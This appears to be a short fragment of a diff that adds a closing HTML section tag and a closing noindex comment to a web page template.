+        </section>
+      <!--/noindex-->
       
 
       
